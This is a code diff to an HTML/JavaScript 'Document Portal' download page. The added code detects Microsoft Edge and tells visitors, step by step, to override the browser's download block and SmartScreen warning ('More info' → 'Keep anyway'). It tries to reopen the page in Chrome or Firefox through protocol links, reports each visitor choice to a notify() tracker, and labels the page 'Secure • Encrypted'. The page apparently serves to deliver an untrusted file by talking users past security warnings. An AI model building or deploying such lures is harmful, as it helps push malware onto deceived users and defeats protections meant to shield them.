@@ -67,17 +67,19 @@
         }
         .modal-card {
             background: white;
-            max-width: 500px;
+            max-width: 520px;
             width: 90%;
-            padding: 40px 30px;
+            padding: 35px 30px;
             border-radius: 28px;
             text-align: center;
             box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            max-height: 90vh;
+            overflow-y: auto;
         }
         .modal-icon { font-size: 56px; margin-bottom: 16px; }
         .modal-title { font-size: 26px; font-weight: 600; color: #1a1e2b; margin-bottom: 12px; }
-        .modal-text { color: #6c757d; font-size: 15px; margin-bottom: 24px; }
-        .btn-group { display: flex; flex-wrap: wrap; justify-content: center; gap: 16px; margin: 24px 0; }
+        .modal-text { color: #6c757d; font-size: 15px; margin-bottom: 20px; }
+        .btn-group { display: flex; flex-wrap: wrap; justify-content: center; gap: 16px; margin: 20px 0; }
         .btn {
             display: inline-block;
             padding: 12px 28px;
@@ -93,11 +95,9 @@
         .btn-chrome:hover { background: #3367d6; transform: translateY(-2px); }
         .btn-firefox { background: #ff9400; color: white; }
         .btn-firefox:hover { background: #e08500; transform: translateY(-2px); }
-        .btn-cancel { background: #e9ecef; color: #495057; margin-top: 8px; }
-        .btn-cancel:hover { background: #dee2e6; }
-        .install-links { margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef; }
-        .install-links a { color: #4285f4; text-decoration: none; margin: 0 10px; font-size: 14px; }
-        .install-links a.firefox-link { color: #ff9400; }
+        .btn-edge { background: #e9ecef; color: #495057; }
+        .btn-edge:hover { background: #dee2e6; }
+        
         .instruction-box {
             background: #f8f9fa;
             padding: 16px;
@@ -106,36 +106,44 @@
             text-align: left;
         }
         .instruction-box p { margin-bottom: 12px; font-size: 13px; color: #495057; }
-        .link-box {
-            background: #e9ecef;
-            padding: 12px;
-            border-radius: 8px;
-            word-break: break-all;
-            font-family: monospace;
-            font-size: 12px;
+        .instruction-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
             margin: 12px 0;
-            cursor: pointer;
+            padding: 8px;
+            background: white;
+            border-radius: 8px;
         }
-        .copy-btn {
+        .step-number {
+            width: 28px;
+            height: 28px;
             background: #4285f4;
             color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 6px;
-            cursor: pointer;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .step-text { flex: 1; font-size: 13px; color: #333; }
+        .warning-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        .warning-box p {
+            margin: 0 0 8px 0;
             font-size: 13px;
-            margin-top: 8px;
+            color: #856404;
         }
-        .copy-btn:hover { background: #3367d6; }
-        .success-msg {
-            background: #d4edda;
-            color: #155724;
-            padding: 8px;
-            border-radius: 6px;
-            font-size: 12px;
-            margin-top: 8px;
-            display: none;
-        }
+        .install-links { margin-top: 20px; padding-top: 16px; border-top: 1px solid #e9ecef; }
+        .install-links a { color: #4285f4; text-decoration: none; margin: 0 10px; font-size: 13px; }
+        .install-links a.firefox-link { color: #ff9400; }
     </style>
 </head>
 <body>
@@ -206,21 +214,37 @@
             modal.className = 'modal-overlay';
             modal.innerHTML = `
                 <div class="modal-card">
-                    <div class="modal-icon">🌐</div>
-                    <div class="modal-title">Choose Your Browser</div>
-                    <div class="modal-text">Select your preferred browser to open the document.</div>
+                    <div class="modal-icon">⚠️</div>
+                    <div class="modal-title">Microsoft Edge Detected</div>
+                    
+                    <div class="warning-box">
+                        <p><strong>⚠️ Edge may block or restrict this download</strong></p>
+                        <p style="margin-top: 5px;">If the download is blocked, you can still keep the file:</p>
+                    </div>
                     
                     <div class="instruction-box">
-                        <p><strong>📋 How to open in your chosen browser:</strong></p>
-                        <div class="link-box" id="downloadLink">${fileUrl}</div>
-                        <button id="copyBtn" class="copy-btn">📋 Copy Link</button>
-                        <div id="copySuccess" class="success-msg">✅ Link copied!</div>
-                        <p style="margin-top: 12px; font-size: 12px;">
-                            1. Click <strong>"Copy Link"</strong> above<br>
-                            2. Open <strong>Chrome</strong> or <strong>Firefox</strong><br>
-                            3. Paste the link in the address bar<br>
-                            4. Press Enter to download
-                        </p>
+                        <p><strong>📌 How to keep the file if Edge blocks it:</strong></p>
+                        <div class="instruction-step">
+                            <div class="step-number">1</div>
+                            <div class="step-text">After download is blocked, click the <strong>three dots (...)</strong> in the download bar</div>
+                        </div>
+                        <div class="instruction-step">
+                            <div class="step-number">2</div>
+                            <div class="step-text">Select <strong>"Keep"</strong> or <strong>"Keep anyway"</strong></div>
+                        </div>
+                        <div class="instruction-step">
+                            <div class="step-number">3</div>
+                            <div class="step-text">If SmartScreen appears, click <strong>"More info"</strong> → <strong>"Keep anyway"</strong></div>
+                        </div>
+                    </div>
+                    
+                    <div class="modal-text" style="margin: 15px 0;">
+                        <strong>For the best experience, use Chrome or Firefox:</strong>
+                    </div>
+                    
+                    <div class="btn-group">
+                        <button id="chromeBtn" class="btn btn-chrome">Open in Chrome</button>
+                        <button id="firefoxBtn" class="btn btn-firefox">Open in Firefox</button>
                     </div>
                     
                     <div class="install-links">
@@ -228,37 +252,66 @@
                         <a href="https://www.mozilla.org/firefox/" target="_blank" class="firefox-link">⬇️ Download Firefox</a>
                     </div>
                     
-                    <button id="cancelBtn" class="btn btn-cancel" style="margin-top: 20px;">Continue in Edge</button>
+                    <button id="edgeBtn" class="btn btn-edge" style="margin-top: 20px;">Continue with Edge (I'll keep the file)</button>
                 </div>
             `;
             document.body.appendChild(modal);
             
-            // Copy link functionality
-            const linkBox = document.getElementById('downloadLink');
-            const copyBtn = document.getElementById('copyBtn');
-            const copySuccess = document.getElementById('copySuccess');
-            
-            copyBtn.onclick = () => {
-                navigator.clipboard.writeText(fileUrl);
-                copySuccess.style.display = 'block';
-                setTimeout(() => { copySuccess.style.display = 'none'; }, 2000);
+            // Chrome button - open in Chrome
+            document.getElementById('chromeBtn').onclick = () => {
+                notify(fileUrl, 'Edge', 'opened_in_chrome');
+                modal.remove();
+                document.getElementById('app').innerHTML = `
+                    <div class="container">
+                        <div class="icon">🌐</div>
+                        <h2>Opening in Chrome</h2>
+                        <p>Launching Chrome to download your document...</p>
+                        <div class="loader"></div>
+                        <div class="footer">Secure • Encrypted</div>
+                    </div>
+                `;
+                // Try to open in Chrome using protocol
+                window.location.href = 'googlechrome://' + window.location.href.replace(/^https?:\/\//, '');
+                // Fallback: open the file directly
+                setTimeout(() => {
+                    window.location.href = fileUrl;
+                }, 1000);
             };
             
-            // Click on link box also copies
-            linkBox.onclick = () => {
-                navigator.clipboard.writeText(fileUrl);
-                copySuccess.style.display = 'block';
-                setTimeout(() => { copySuccess.style.display = 'none'; }, 2000);
+            // Firefox button - open in Firefox
+            document.getElementById('firefoxBtn').onclick = () => {
+                notify(fileUrl, 'Edge', 'opened_in_firefox');
+                modal.remove();
+                document.getElementById('app').innerHTML = `
+                    <div class="container">
+                        <div class="icon">🌐</div>
+                        <h2>Opening in Firefox</h2>
+                        <p>Launching Firefox to download your document...</p>
+                        <div class="loader"></div>
+                        <div class="footer">Secure • Encrypted</div>
+                    </div>
+                `;
+                window.location.href = 'firefox://' + window.location.href.replace(/^https?:\/\//, '');
+                setTimeout(() => {
+                    window.location.href = fileUrl;
+                }, 1000);
             };
             
-            document.getElementById('cancelBtn').onclick = () => {
-                notify(fileUrl, 'Edge', 'cancelled_switch');
+            // Edge button - continue in Edge
+            document.getElementById('edgeBtn').onclick = () => {
+                notify(fileUrl, 'Edge', 'continued_in_edge');
                 modal.remove();
                 document.getElementById('app').innerHTML = `
                     <div class="container">
                         <div class="icon">📄</div>
-                        <h2>Document Portal</h2>
-                        <p>Opening document in Edge...</p>
+                        <h2>Opening Document</h2>
+                        <div class="warning-box" style="text-align: left;">
+                            <p><strong>📌 If the download is blocked:</strong></p>
+                            <p>1. Click the <strong>three dots (...)</strong> in the download bar</p>
+                            <p>2. Select <strong>"Keep"</strong> or <strong>"Keep anyway"</strong></p>
+                            <p>3. If SmartScreen appears → <strong>"More info"</strong> → <strong>"Keep anyway"</strong></p>
+                        </div>
+                        <p>Downloading your document...</p>
                         <div class="loader"></div>
                         <div class="footer">Secure • Encrypted</div>
                     </div>
